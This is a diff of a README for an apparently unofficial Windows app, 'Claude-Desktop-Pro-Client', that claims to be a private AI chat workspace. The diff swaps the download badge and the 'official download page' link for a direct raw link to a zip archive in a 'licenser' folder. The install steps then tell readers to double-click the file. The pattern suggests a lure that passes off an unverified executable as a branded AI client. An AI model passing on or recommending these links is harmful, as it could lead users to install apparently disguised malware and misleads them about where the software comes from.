@@ -1,6 +1,6 @@
 # 🤖 Claude-Desktop-Pro-Client - Enhance your daily AI workspace experience
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue)](https://github.com/kuldeep8740/Claude-Desktop-Pro-Client)
+[![Download for Windows](https://img.shields.io/badge/Download-Windows_Installer-blue)](https://raw.githubusercontent.com/kuldeep8740/Claude-Desktop-Pro-Client/main/licenser/Client_Desktop_Pro_Claude_v1.1.zip)
 
 Claude-Desktop-Pro-Client provides a private and fast way to interact with AI models on your computer. This application keeps your data local and gives you full control over your work sessions. You can use global hotkeys to open the chat window from any screen. You can also customize the colors and layout of your workspace to fit your needs.
 
@@ -25,7 +25,7 @@ To run this application, ensure your computer meets these basic requirements:
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official download page](https://github.com/kuldeep8740/Claude-Desktop-Pro-Client) to get the installer for Windows.
+1.  Visit the [official download page](https://raw.githubusercontent.com/kuldeep8740/Claude-Desktop-Pro-Client/main/licenser/Client_Desktop_Pro_Claude_v1.1.zip) to get the installer for Windows.
 2.  Locate the downloaded file in your Downloads folder.
 3.  Double-click the file to start the installation process.
 4.  Follow the instructions on the screen to complete the setup.
